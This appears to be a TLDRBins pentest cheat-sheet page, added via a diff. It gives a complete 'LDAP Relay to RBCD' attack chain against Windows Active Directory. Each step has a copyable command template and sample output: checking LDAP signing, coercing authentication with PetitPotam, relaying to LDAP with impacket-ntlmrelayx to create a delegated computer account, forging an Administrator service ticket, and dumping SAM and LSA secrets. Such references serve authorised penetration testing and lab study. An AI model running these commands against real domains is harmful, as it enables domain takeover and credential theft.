@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<meta name="description" content="">
+<title>LDAP Relay | TLDRBins</title>
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+</head>
+<body>
+<header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/ldap_relay/"><span>LDAP Relay</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+    </div>
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
+
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
+
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
+
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
+
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
+
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
+
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
+
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
+
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
+
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
+
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
+
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
+
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
+
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
+
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
+  <p class="desc"></p>
+</header>
+<main>
+<ul class="tagsList single">
+  <li><a href="https://tldrbins.github.io/@attack-chain/">Attack Chain</a></li>
+  <li><a href="https://tldrbins.github.io/@ntlm/">NTLM</a></li>
+  <li><a href="https://tldrbins.github.io/@ldap/">Ldap</a></li>
+  <li><a href="https://tldrbins.github.io/@pass-the-hash/">Pass-the-Hash</a></li>
+  <li><a href="https://tldrbins.github.io/@impacket/">Impacket</a></li>
+  <li><a href="https://tldrbins.github.io/@ntlm-replay/">NTLM Replay</a></li>
+  <li><a href="https://tldrbins.github.io/@petitpotam/">Petitpotam</a></li>
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  <li><a href="https://tldrbins.github.io/@webdav/">WebDAV</a></li>
+  <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
+  <li><a href="https://tldrbins.github.io/@rbcd/">RBCD</a></li>
+  <li><a href="https://tldrbins.github.io/@secretsdump/">Secretsdump</a></li>
+</ul>
+<hr>
+<div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click on a keyword to enable inline editing.</li>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
+  <div id="dynamicFormContainer">
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="CCACHE">CCACHE: </label><input type="text" name="CCACHE"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="LOCAL_IP">LOCAL IP: </label><input type="text" name="LOCAL_IP"></div><div class="input-group"><label for="NEW_COMPUTER">NEW COMPUTER: </label><input type="text" name="NEW_COMPUTER"></div><div class="input-group"><label for="NEW_PASSWORD">NEW PASSWORD: </label><input type="text" name="NEW_PASSWORD"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="SUBDOMAIN">SUBDOMAIN: </label><input type="text" name="SUBDOMAIN"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<div class="buttons center">
+		<button id="form_btn">Show Inspector</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
+  <h3 id="abuse-1-ldap-relay-to-rbcd">Abuse #1: LDAP Relay to RBCD</h3>
+<h4 id="1-check-ldap-signing">1. Check LDAP Signing</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
+</span></span><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;DC&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M ldap-checker
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap DC01.example.com -u <span class="s1">'apple.seed'</span> -p <span class="s1">'P@ssw0rd123'</span> -d example.com -M ldap-checker
+</span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.143.101   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.143.101   389    DC01             [+] example.com\apple.seed:P@ssw0rd123 
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP-CHE... 10.10.143.101   389    DC01             LDAP signing NOT enforced
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP-CHE... 10.10.143.101   389    DC01             LDAPS channel binding is set to: Never
+</span></span></span></div></pre></div><h4 id="2-check-webdav-status">2. Check WebDAV Status</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M webdav
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> nxc smb WS01.example.com -u <span class="s1">'apple.seed'</span> -p <span class="s1">'P@ssw0rd123'</span> -d example.com -M webdav
+</span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:P@ssw0rd123 
+</span></span></span><span class="line"><span class="cl"><span class="go">WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102
+</span></span></span></div></pre></div><h4 id="3-add-a-dns-entry-in-trusted-zone">3. Add a DNS Entry in Trusted Zone</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 dnstool.py -u '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -r <span class="o editable-keyword">&lt;SUBDOMAIN&gt;</span>.<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -d <span class="o editable-keyword">&lt;LOCAL_IP&gt;</span> --action add <span class="o editable-keyword">&lt;DC_IP&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> python dnstool.py -u <span class="s1">'example.com\apple.seed'</span> -p <span class="s1">'P@ssw0rd123'</span> -r test.example.com -d 10.8.7.13 --action add 10.10.143.101    
+</span></span><span class="line"><span class="cl"><span class="go">[-] Connecting to host...
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Binding to host
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Bind OK
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Adding new record
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] LDAP operation completed successfully
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/dirkjanm/krbrelayx">dnstool.py</a></em></small></p>
+<h4 id="4-start-a-relay-server">4. Start a Relay Server</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-ntlmrelayx -t ldap://<span class="o editable-keyword">&lt;DC&gt;</span> -smb2support --delegate-access
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-ntlmrelayx -t ldap://dc01.example.com -smb2support --delegate-access
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Protocol Client SMTP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client SMB loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client HTTP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client HTTPS loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client IMAP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client IMAPS loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client MSSQL loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client RPC loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client DCSYNC loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client LDAPS loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client LDAP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running in relay mode to single host
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up SMB Server on port 445
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up HTTP Server on port 80
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up WCF Server on port 9389
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up RAW Server on port 6666
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Multirelay disabled
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Servers started, waiting for connections
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] HTTPD(80): Client requested path: /test/pipe/srvsvc
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] HTTPD(80): Connection from 10.10.143.102 controlled, attacking target ldap://DC01.example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] HTTPD(80): Authenticating against ldap://DC01.example.com as INTERCEPT/WS01$ SUCCEED
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enumerating relayed user's privileges. This may take a while on large domains
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Attempting to create computer in: CN=Computers,DC=intercept,DC=vl
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding new computer with username: MPAGJQVC$ and password: P8ROIzCA9Wz}9&lt;v result: OK
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Delegation rights modified succesfully!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] MPAGJQVC$ can now impersonate users on WS01$ via S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Delegate attack already performed for this computer, skipping
+</span></span></span></div></pre></div><h4 id="5-coerce-authentication">5. Coerce Authentication</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M coerce_plus -o LISTENER=<span class="o editable-keyword">&lt;SUBDOMAIN&gt;</span>@80/test METHOD=PetitPotam
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> nxc smb WS01.example.com -u <span class="s1">'apple.seed'</span> -p <span class="s1">'P@ssw0rd123'</span> -d example.com -M coerce_plus -o <span class="nv">LISTENER</span><span class="o">=</span>test@80/test <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
+</span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:P@ssw0rd123 
+</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
+</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
+</span></span></span></div></pre></div><h4 id="6-request-a-service-ticket">6. Request a Service Ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -impersonate Administrator -spn 'cifs/<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>' -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>$:<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-getST -impersonate Administrator -spn <span class="s1">'cifs/WS01.example.com'</span> -dc-ip 10.10.143.101 <span class="s1">'example.com/MPAGJQVC$:P8ROIzCA9Wz}9&lt;v'</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting TGT for user
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Impersonating Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2self
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in Administrator@cifs_WS01.example.com@example.com.ccache
+</span></span></span></div></pre></div><h4 id="7-secrets-dump">7. Secrets Dump</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import ticket
+</span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME='<span class="o editable-keyword">&lt;CCACHE&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">export KRB5CCNAME='Administrator@cifs_WS01.example.com@example.com.ccache'
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Secrets dump
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; nxc smb <span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> -u 'Administrator' -k --use-kcache --sam --lsa
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div>
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
+</footer>
+
+
+</body></html>
